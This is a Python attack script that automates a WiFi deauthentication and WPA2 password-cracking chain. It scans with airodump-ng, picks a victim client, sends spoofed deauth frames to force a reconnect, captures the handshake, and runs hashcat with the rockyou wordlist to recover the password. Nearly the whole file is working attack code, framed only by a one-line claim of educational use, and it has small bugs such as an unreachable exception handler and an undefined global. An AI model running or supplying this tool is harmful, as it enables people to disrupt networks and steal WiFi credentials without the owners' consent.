#!/usr/bin/env python
# -*- coding: utf-8 -*-
# -----------------------------------------------------------------------------
# /**
#  * @file deauth.py
#  * @author Oscar Gomez Fuente <oscargomezf@gmail.com>
#  * @modified Oscar Gomez Fuente <oscargomezf@gmail.com>
#  * @date 2025-06-23 17:39:37 
#  * @version 1.0
#  * @section DESCRIPTION
#  *     This Python script is part of a custom library designed to perform
#  *     WiFi Deauthentication (DeAuth) attacks using the Scapy framework. The
#  *     script allows the user to craft and send IEEE 802.11 deauthentication
#  *     frames to forcibly disconnect a target device from a specified WiFi
#  *     access point (AP).
#  *     The script defines a DeauthAttack class that:
#  *         - Builds deauthentication packets spoofing the AP's MAC address.
#  *         - Sends a configurable number of deauthentication frames to a
#  *           selected client device at a specified interval.
#  *         - Includes a safety check to ensure the selected network interface
#  *           is in monitor mode.
#  *
#  *     It provides a simple, programmable interface to automate WiFi
#  *     deauthentication attacks for educational, research, and controlled
#  *     testing purposes.
#  *
#  *     Required packages: scapy, print_helper_logger
#  *     Install with: pip install scapy print_helper_logger
#  */
# -----------------------------------------------------------------------------

import os
import sys
import re
import shutil
import subprocess
import importlib
import importlib.util
import signal
import time
import tempfile
import errno
from datetime import datetime
from check_dependencies import check_required_packages, check_required_tools
from print_helper_logger import Print_Helper, Severity_Level

# Initialize custom logger
ph = Print_Helper(Severity_Level.DEBUG, True, True, None)

# Check required packages
if not check_required_packages(ph):
	sys.exit(1)
else: 
	from deauth_lib.deauth import DeauthAttack
	from print_helper_logger import Print_Helper, Severity_Level

# Check required tools
if not check_required_tools(ph):
	sys.exit(1)

# Is hte interface selected?
flag_interface = False
# paths
# Get the current working directory (where the script is executed from)
current_path = os.getcwd()
rockyou_wordlist_path = f"{current_path}/wordlist/rockyou.txt"

def get_monitor_mode_interfaces():
	"""
	Scans available wireless interfaces and returns a list of those that support monitor mode.
	Uses 'iw dev' to get interface names, and 'iw list' to check their capabilities.
	"""
	try:
		output = subprocess.check_output("iw dev", shell=True).decode()
		interfaces = re.findall(r'Interface\s+(\w+)', output)
		monitor_capable = []

		for iface in interfaces:
			try:
				info = subprocess.check_output(f"iw list", shell=True).decode()
				# Buscamos si la interfaz soporta modo monitor
				if re.search(r"Supported interface modes.*?monitor", info, re.DOTALL):
					monitor_capable.append(iface)
			except subprocess.CalledProcessError:
				continue

		return monitor_capable

	except subprocess.CalledProcessError:
		return []

def run_command(command):
	"""
	Runs a shell command and returns (True, output) if successful, else (False, error).
	"""
	try:
		result = subprocess.run(
			command, shell=True,
			check=True,
			stdout=subprocess.PIPE,
			stderr=subprocess.PIPE,
			text=True
		)
		return True, result.stdout.strip()
	except KeyboardInterrupt:
		ph.print_wrn(f"Execution interrupted by user (CTRL+C)\n")
		return False, "User interrupted"
	except subprocess.CalledProcessError as e:
		return False, e.stderr.strip()

# Launch airodump-ng in a new terminal window
def launch_airodump_inline(iface, output_file):
	"""
	Runs airodump-ng inside the same terminal as the script, with live output.
	"""
	try:
		subprocess.run(
			["sudo", "airodump-ng", "--output-format", "csv", "-w", output_file, iface]
		)
	except KeyboardInterrupt:
		ph.print_wrn(f"Execution interrupted by user (CTRL+C)\n")
	except KeyboardInterrupt:
		ph.print_wrb(f"Scan interrupted by user\n")

# Wait for the user to press CTRL+C to interrupt manually
def wait_for_user():
	"""
	Waits for the user to press any key before starting the scan.
	Just a placeholder wait loop until user kills the external terminal.
	"""
	ph.print_inf(f"Press [Enter] to begin scanning with airodump-ng...\n")
	ph.print_inf(f"You will run airodump-ng in new window\n")
	ph.print_inf(f"When you're done scanning, press CTRL+C there to stop\n")
	input(" ")

# Parse the CSV file to extract only associated client stations
def parse_airodump_csv(input_prefix_file):
	"""
	Parses the CSV output from airodump-ng to extract:
	- Associated clients (stations)
	- Their respective BSSID and channel (from the AP section)
	Returns a list of tuples: (client_mac, bssid, channel)
	"""
	csv_file = input_prefix_file + "-01.csv"
	if not os.path.isfile(csv_file):
		ph.print_wrn(f"No CSV output found\n")
		return []

	with open(csv_file, "r", encoding="utf-8", errors="ignore") as file:
		content = file.read()

	if "Station MAC" not in content:
		ph.print_wrn(f"No clients found in scan\n")
		return []

	# Split the AP and Station sections from the CSV
	sections = content.split("Station MAC")
	ap_lines = sections[0].strip().splitlines()[2:]       # Skip AP headers
	station_lines = sections[1].strip().splitlines()[2:]  # Skip station headers

	# Map BSSID → Channel for lookup
	bssid_channel_map = {}
	for line in ap_lines:
		if not line.strip():
			continue
		parts = [x.strip() for x in line.split(",")]
		if len(parts) > 5:
			bssid = parts[0]
			channel = parts[3]  # Usually the 4th column is channel
			bssid_channel_map[bssid] = channel

	# Extract only clients that are associated to a valid BSSID
	clients = []
	for line in station_lines:
		if not line.strip():
			continue
		parts = [x.strip() for x in line.split(",")]
		client_mac = parts[0]
		bssid = parts[5]

		if bssid.lower() != "(not associated)":
			channel = bssid_channel_map.get(bssid, "Unknown")
			clients.append((client_mac, bssid, channel))

	if not clients:
		ph.print_wrn(f"No associated clients detected in CSV\n")
		return []

	return clients

# Restore interface to original mode
def restore_interface(iface, mode="managed"):
	ph.print_inf(f"Restoring interface to mode: {mode}\n")
	run_command(f"sudo ifconfig {iface} down")
	run_command(f"sudo iwconfig {iface} mode {mode}")
	run_command(f"sudo ifconfig {iface} up")

# Prompt and execute deauth attack
def run_deauth_attack(iface, target_mac, ap_mac, deauth_count=25):
	"""
	Executes a deauthentication attack against a selected client and access point.
	"""
	try:
		ph.print_inf(f"Starting deauth attack on {target_mac} → AP {ap_mac}\n")
		DeauthAttack.check_interface(iface)
		attack = DeauthAttack(ph, iface, target_mac, ap_mac, count=deauth_count, interval=0.5)
		attack.run()
	except Exception as e:
		ph.print_err(f"Attack error: {e}\n")

def select_target_device(clients):
	"""
	Prompts the user to select one associated client from the list.
	Filters out any clients with invalid or non-positive channel numbers.
	Returns (target_mac, bssid, channel) or exits on invalid input.
	"""
	global flag_interface

	# Filter out clients with invalid channel values
	valid_clients = [
		(client_mac, bssid, channel)
		for client_mac, bssid, channel in clients
		if isinstance(channel, (int, str)) and str(channel).isdigit() and int(channel) > 0
	]

	if not valid_clients:
		ph.print_err(f"No clients with valid channel assignments found\n")
		if flag_interface:
			restore_interface(interface)
		sys.exit(1)

	# Display valid clients to the user
	ph.print_inf(f"📋 Available targets with valid channels:\n")
	for idx, (mac, bssid, ch) in enumerate(valid_clients, start=1):
		ph.print_inf(f"{idx}) {mac} → BSSID: {bssid} (Channel {ch})\n")

	try:
		choice = input("Enter the number of the client to target: ").strip()
		selected_index = int(choice) - 1

		if 0 <= selected_index < len(valid_clients):
			target_mac, bssid, channel = valid_clients[selected_index]
			ph.print_inf(f"🎯 Target selected: {target_mac} → AP: {bssid} on channel {channel}\n")
			flag_interface = True
			return target_mac, bssid, channel
		else:
			ph.print_err(f"Invalid selection. Index out of range\n")
			sys.exit(1)
	except ValueError:
		ph.print_err(f"Invalid input. Please enter a number\n")
		sys.exit(1)

def launch_handshake_capture(iface, bssid, channel, client_mac, output_prefix_file):
	"""
	Launches airodump-ng to capture handshake traffic on a given channel/BSSID.
	Output file will be named using format: MAC_<MAC>_CH_<CH>_<YYYYMMDD_HHMM>.cap
	"""
	cmd = [
		"sudo", "airodump-ng",
		"-c", str(channel),
		"--bssid", bssid,
		"--write", output_prefix_file,
		iface
	]

	try:
		process = subprocess.Popen(cmd)
		ph.print_inf(f"Handshake capture started: output → {output_prefix_file}-01.cap\n")
		return process
	except Exception as e:
		ph.print_err(f"Failed to start handshake capture: {e}\n")
		return None

def delete_non_cap_files():
	"""
	Deletes all files in the specified directory except those ending in .cap.
	"""
	global current_path

	directory_path=f"{current_path}/captures"

	if not os.path.isdir(directory_path):
		ph.print_err(f"Provided path is not a valid directory: {directory_path}\n")
		return

	for file_name in os.listdir(directory_path):
		file_path = os.path.join(directory_path, file_name)
		if os.path.isfile(file_path) and not file_name.endswith(".cap"):
			try:
				os.remove(file_path)
				ph.print_inf(f"Removed: {file_path}\n")
			except Exception as e:
				ph.print_wrn(f"Could not delete {file_path}: {e}\n")

def convert_pcap_to_hash(input_file, output_file="wpa2.hc22000"):
	"""
	Converts a .cap or .pcapng file to Hashcat-compatible .hc22000 format using hcxpcapngtool.
	"""
	if not os.path.isfile(input_file):
		ph.print_err(f"Input file not found: {input_file}\n")
		return False

	cmd = ["sudo", "hcxpcapngtool", "-o", output_file, input_file]
	try:
		subprocess.run(
			cmd,
			check=True,
			stdout=subprocess.DEVNULL,
			stderr=subprocess.DEVNULL
		)
		if os.path.isfile(output_file):
			ph.print_inf(f"(hcxpcapngtool) Conversion successful: {output_file}\n")
			return True
		else:
			ph.print_err(f"(hcxpcapngtool) Conversion error\n")
			return False
	except subprocess.CalledProcessError as e:
		ph.print_err(f"Error during conversion: {e}\n")
		return False
	except FileNotFoundError:
		ph.print_err(f"hcxpcapngtool not found. Make sure it's installed and in your PATH\n")
		return False

from pathlib import Path

def show_hash(input_file):
	# Check if the file exists and is a regular file
	if os.path.isfile(input_file):
		# Open the file and print each line
		hash =""
		with open(input_file, "r", encoding="utf-8") as file:
			for line in file:
				hash = hash + line.strip() + "\n"
		ph.print_inf(f"{input_file}: {hash}")
	else:
		ph.print_err(f"File 'wpa2.hc22000' does not exist\n")

import subprocess
import os

def crack_hash_with_hashcat(hash_file, wordlist_path="rockyou.txt", hash_mode=22000, potfile_path="hashcat.potfile"):
	"""
	Runs Hashcat to crack a hash using the specified wordlist.
	Returns the cracked password if found, else None.
	"""
	if not os.path.isfile(hash_file) or not os.path.isfile(wordlist_path):
		return None

	cmd = [
		"sudo",
		"hashcat",
		"-m", str(hash_mode),         # Hash mode (22000 for WPA/WPA2 PMKID+EAPOL)
		"-a", "0",                    # Attack mode 0 = straight (dictionary)
		hash_file,
		wordlist_path,
		"--potfile-path", potfile_path,
		"--quiet"
	]

	try:
		subprocess.run(
			cmd,
			check=True,
			stdout=subprocess.DEVNULL,
			stderr=subprocess.DEVNULL
		)

		# Parse potfile to extract cracked password
		if os.path.isfile(potfile_path):
			with open(potfile_path, "r", encoding="utf-8", errors="ignore") as f:
				for line in f:
					parts = line.strip().split(":", 1)
					if len(parts) == 2:
						return parts[1]  # Return the cracked password
		return None
	except subprocess.CalledProcessError:
		return None

def main():
	global current_path

	if os.geteuid() != 0:
		ph.print_err(f"This script must be run as root... Exiting\n")
		sys.exit(1)

	# Step 1: Select the interface with monitor capability
	interfaces = get_monitor_mode_interfaces()
	if interfaces:
		ph.print_inf(f"Interfaces that support monitor mode:\n")
		for idx, iface in enumerate(interfaces, start=1):
			ph.print_inf(f"{idx})   {iface}\n")
	else:
		ph.print_err(f"No interfaces supporting monitor mode were found\n")
		sys.exit(1)
	
	while True:
		try:
			choice = int(input("Select an interface by number: "))
			if 1 <= choice <= len(interfaces):
				interface = interfaces[choice - 1]
				ph.print_inf(f"You selected: {interface}\n")
				break
			else:
				ph.print_wrn(f"Invalid selection. Please choose a number from the list\n")
		except ValueError:
			ph.print_wrn(f"Invalid input. Please enter a valid number\n")

	# Step 2: Bring interface down
	success, msg = run_command(f"sudo ifconfig {interface} down\n")
	if success:
		ph.print_inf(f"🔻 ifconfig down: OK\n")
	else:
		ph.print_err(f"🔻 ifconfig down: {msg}\n")
		sys.exit(1)

	# Step 3: Set interface to monitor mode
	success, msg = run_command(f"sudo iwconfig {interface} mode monitor\n")
	if success:
		ph.print_inf(f"📡 iwconfig monitor: OK\n")
	else:
		ph.print_err(f"📡 iwconfig monitor: {msg}\n")
		sys.exit(1)

	# Step 4: Bring interface back up
	success, msg = run_command(f"sudo ifconfig {interface} up\n")
	if success:
		ph.print_inf(f"🔺 ifconfig up: OK\n")
	else:
		ph.print_err(f"🔺 ifconfig up: {msg}\n")
		sys.exit(1)

	wait_for_user()

	# Temporary file to store airodump-ng CSV output
	csv_prefix = tempfile.mktemp()
	launch_airodump_inline(interface, csv_prefix)

	associated_clients = parse_airodump_csv(csv_prefix)

	if associated_clients:
		# Select target from the associated list
		target_mac, ap_mac, channel = select_target_device(associated_clients)

		# Prompt user for deauth packet count
		count_str = input("Enter number of deauth packets to send [default: 25]: ").strip()
		try:
			deauth_count = int(count_str) if count_str else 25
		except ValueError:
			ph.print_wrn(f"Invalid input. Using default of 25 packets\n")
			deauth_count = 25

		# Clean MAC format (remove colons)
		mac_clean = target_mac.replace(":", "").upper()
		bssid = ap_mac.replace(":", "").upper()
		timestamp = datetime.now().strftime("%Y%m%d_%H%M")
		os.makedirs(f"{current_path}/captures", exist_ok=True)
		output_prefix_file = f"{current_path}/captures/MAC_{mac_clean}_BSSID_{bssid}_CH_{channel}_{timestamp}"
		# Launch handshake capture before attack
		capture_proc = launch_handshake_capture(
			iface=interface,
			bssid=ap_mac,
			channel=channel,
			client_mac=target_mac,
			output_prefix_file=output_prefix_file
		)

		# Run deauth attack
		run_deauth_attack(interface, target_mac, ap_mac, deauth_count)

		# Stop handshake capture
		if capture_proc:
			try:
				ph.print_inf(f"Stopping handshake capture...\n")
				capture_proc.kill()
				capture_proc.wait()
				os.system("stty sane")
				print("\n")
				delete_non_cap_files()
				# Convert pcap to hash
				if os.path.isfile(f"{output_prefix_file}-01.cap"):
					ph.print_inf(f"Convert pcap to hash using hcxpcapngtool\n")
					hash_output_file = f"{current_path}/captures/wpa2.hc22000"
					pcap_input_file = f"{output_prefix_file}-01.cap"
					res = convert_pcap_to_hash(pcap_input_file, hash_output_file)
					if res:
						show_hash(hash_output_file)
						ph.print_inf("Trying to crack the hash using Hashcat (this task may take several minutes)...\n")
						password = crack_hash_with_hashcat(
							hash_file=hash_output_file,
							wordlist_path=rockyou_wordlist_path,
							hash_mode=22000,
							potfile_path=f"{current_path}/captures/hashcat.potfile"
						)
						if password:
							ph.print_wrn(f"Password found: {password}\n")
						else:
							ph.print_err(f"Password not found\n")
							ph.print_wrn(f"Password found: {password}\n")
				else:
					ph.print_err(f"Not found the hanshake capture file\n")
			except Exception as e:
				ph.print_wrn(f"Could not terminate handshake capture cleanly: {e}\n")

	else:
		ph.print_err(f"No associated clients available\n")

	if flag_interface:
		restore_interface(interface)
	sys.exit(0)

if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		ph.print_wrn(f"Execution interrupted by user (CTRL+C)\n")
		if flag_interface:
			restore_interface(interface)
		sys.exit(0)
